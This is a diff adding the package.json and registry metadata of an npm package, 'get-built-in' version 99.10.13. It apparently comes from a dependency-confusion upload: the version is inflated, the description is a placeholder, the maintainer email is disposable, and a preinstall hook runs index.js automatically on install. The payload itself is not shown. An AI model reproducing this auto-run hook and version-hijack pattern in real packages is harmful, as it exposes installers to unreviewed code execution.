@@ -1,0 +1,39 @@
+{
+    "name": "get-built-in",
+    "version": "99.10.13",
+    "description": "rukkaz package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "get-built-in@99.10.13",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-eiagRHt7y+7SaL10v7c5HtMS1/anTV50QlV4BrkMy7EZABaSZ2iyLoL7FymZoFEMC769UlZAo8MXHGcgFi5JbQ==",
+        "shasum": "7304da185a4b5210e11d5d99d69ea8e244d5b7e9",
+        "tarball": "https://registry.npmjs.org/get-built-in/-/get-built-in-99.10.13.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5070,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQOX1ACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrMGg/8CoFKvukvn+q85i//gwe5igTb0YjM2zLRSU3jWvJKUd3Z7i0m\r\nVjeyORI2tNTbdTm8GWWtCXH553IkwWtf675TP5pzGA6p0KDNxCizJjNsoxPF\r\ndIoIIFnG+Au9jfx51ZGgZmekyHroCWc7cdtEESfxdIVv6ovCUuXEeSl2ClTR\r\nbRyLu+77kzxnWmOE2iPXAW5pxJRyR+1c34jS9tvKRVZgxqnlhCpSCW+juOkr\r\nRttaejwpIlSirxgWN+5HexVpvm0CcsQBHZSCO6rtYUWokvnBc6Mylff0eyz7\r\nyzSviE7bRbgNv2NLiD1P13VAbEZjLasylybnRmVTgs97Dtb+7sgWQ3CeA53L\r\nEzm+qd/ldBS0OEYhjXPj0Cpi36AIX5u3msbo18CVIqLNiuZSqcZ+nHD3stXr\r\nDcR43zRMh4ZxsNhnkrn27HrftCTJD8MqQkcNaR+vQX3Ewt8eI3XNxer6VAXW\r\niNgMRaNCGSI29VjVsGd7dnBX0BSPCxVxG0tbMlRrgwf0tuib11B0bYGvDLgb\r\n20WGapcoVYgjNjSmZW+EaxELENG5bY7xaTwzjmqTD8HovqYfBOxrbOVlhPmT\r\nb6hNeJw8xJfySsZ3zl/lzYM5EbFoqMDapW7HEDdXQKiGaSOlkhuPtZQQegdu\r\n73ud0OpuPPu9BdOn5zRNuc8pq3sxSMO1cZQ=\r\n=SAbx\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "k8x7e6vb",
+        "email": "k8x7e6vb@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "k8x7e6vb",
+            "email": "k8x7e6vb@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/get-built-in_99.10.13_1648420341730_0.018860805793462943"
+    },
+    "_hasShrinkwrap": false
+}
